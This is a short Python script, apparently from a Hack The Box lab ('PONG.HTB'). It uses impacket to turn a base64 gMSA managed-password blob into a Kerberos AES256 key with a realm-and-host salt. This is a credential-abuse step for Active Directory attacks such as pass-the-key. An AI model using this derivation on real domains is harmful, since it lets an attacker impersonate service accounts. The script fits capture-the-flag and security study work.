from impacket.krb5.crypto import _AES256CTS
import base64

b64_blob = "eFkbWLHQ9ZrAkNUPkIoyBnuGsnXyZOPO5eNOWWlCXuW+gcHc8jj3TpS1td5uZu2q3PoJBjL68DchzLF7DRcebEPpqm2SigCrJiwtO/C+RMfgVtphZX8BTmckbsUG2dDbiSLW6gj1jMN8Z9oMmpcbSuAshl5uZU2iCIOBdo3rinaX28jwCTKhkaELO+V+CLmoOfRJ2bYjL8V1QzJssh0/RuiaQ+bRLMasy8cLZ24mZhf3/4akKyRSn39X3E+RT7DEc7xHrxBVevTGTsIeD/3OfzMXs5ZW3fc0Iiut/d4heHjhkIfZhsmDQaZmGq4BMi+rG4HY+6gBkNyvHk3rRa9ozQ=="

pwd = base64.b64decode(b64_blob).decode('utf-16-le', 'replace').encode('utf-8')
# The salt is: <UPPER_REALM>host<lower_samaccountname_no_$>.<lower_dnshostname_suffix>
salt = b'PONG.HTBhostpong_gmsa.pong.htb'
aes256 = _AES256CTS.string_to_key(pwd, salt, b'\x00\x00\x10\x00').contents.hex()

print(f"[*] AES256 Key: {aes256}")
